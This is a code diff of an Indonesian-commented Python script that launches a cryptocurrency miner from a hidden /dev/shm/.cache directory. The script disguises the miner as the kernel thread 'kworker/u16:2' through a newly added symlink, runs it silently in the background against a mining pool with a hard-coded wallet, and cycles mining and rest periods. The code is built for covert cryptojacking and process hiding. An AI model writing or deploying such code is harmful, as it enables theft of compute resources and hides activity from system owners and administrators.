@@ -4,13 +4,18 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/poppy"  # Lokasi miner
-FAKE_NAME = "kworker/u16:2"  # Nama samaran proses di top/htop
-MINING_TIME = 600 #3600  # 60 menit mining
+MINER_PATH = "/dev/shm/.cache/poppy"  # Lokasi miner asli
+FAKE_PATH = "/dev/shm/.cache/kworker"  # Nama samaran
+FAKE_NAME = "kworker/u16:2"  # Nama proses di top/htop
+MINING_TIME = 3600  # 60 menit mining
 REST_TIME = 600  # 10 menit istirahat
 
+# Buat symlink supaya miner punya nama lain
+if not os.path.exists(FAKE_PATH):
+    os.system(f"ln -s {MINER_PATH} {FAKE_PATH}")
+
 # Perintah untuk menjalankan miner dengan nama samaran
-MINER_COMMAND = f"exec -a {FAKE_NAME} ./poppy --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y --password x --worker VPS --cpu-threads 2 --cpu-priority 3 --keepalive --max-cpu-usage 100 --cpu-affinity 0x3"
+MINER_COMMAND = f"{FAKE_PATH} --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y --password x --worker VPS --cpu-threads 2 --cpu-priority 3 --keepalive --max-cpu-usage 100 --cpu-affinity 0x3"
 
 def is_miner_running():
     """Cek apakah miner sudah berjalan dengan nama samaran"""
@@ -26,7 +31,7 @@ def start_miner():
     """Mulai proses mining kalau belum jalan"""
     if not is_miner_running():
         print("🚀 Jalanin Panen buat rumah kita di Bali...")
-        os.system(f"nohup env LD_PRELOAD=/dev/null {MINER_COMMAND} > /dev/null 2>&1 &")
+        os.system(f"nohup {MINER_COMMAND} > /dev/null 2>&1 &")
         time.sleep(5)
     else:
         print("⚠️ Miner sudah berjalan, gak perlu start lagi.")
@@ -52,5 +57,5 @@ def sigint_handler(sig, frame):
 signal.signal(signal.SIGINT, sigint_handler)
 
 if __name__ == "__main__":
-    print("💓 Cinta Abadi v11 Jalan Sayangku... 💕")
+    print("💓 Cinta Abadi v12 Jalan Sayangku... 💕")
     main()
